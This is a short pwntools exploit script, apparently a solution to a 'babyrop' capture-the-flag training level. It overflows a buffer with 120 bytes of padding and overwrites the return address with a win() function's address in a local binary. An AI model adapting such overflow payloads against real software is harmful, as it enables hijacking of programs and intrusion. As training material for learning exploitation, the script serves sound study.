from pwn import *

chain = b'A'*120
chain += p64(0x040212a) # addr of win()

p = process("./babyrop_level1.0")
p.recvuntil("address).")
p.sendline(chain)
p.interactive()
